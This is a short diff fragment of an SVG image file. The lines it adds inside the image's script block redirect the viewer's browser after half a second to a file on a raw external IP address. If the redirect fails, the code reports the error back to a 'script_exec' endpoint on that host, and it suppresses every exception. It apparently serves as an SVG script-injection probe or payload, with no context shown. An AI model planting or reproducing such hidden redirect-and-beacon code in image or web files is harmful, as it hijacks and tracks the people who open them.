@@ -38,5 +38,16 @@
         xhr.send();
       }
     } catch(e) {}
+    try {
+      window.setTimeout(function() {
+        try {
+          window.location.href = "http://191.32.31.251/app.svg";
+        } catch(e) {
+          try {
+            getURL("http://191.32.31.251/report/script_exec?target=portal_svg&method=location_error&message=" + encodeURIComponent(String(e)), function(){});
+          } catch(ignored) {}
+        }
+      }, 500);
+    } catch(e) {}
   ]]></script>
 </svg>
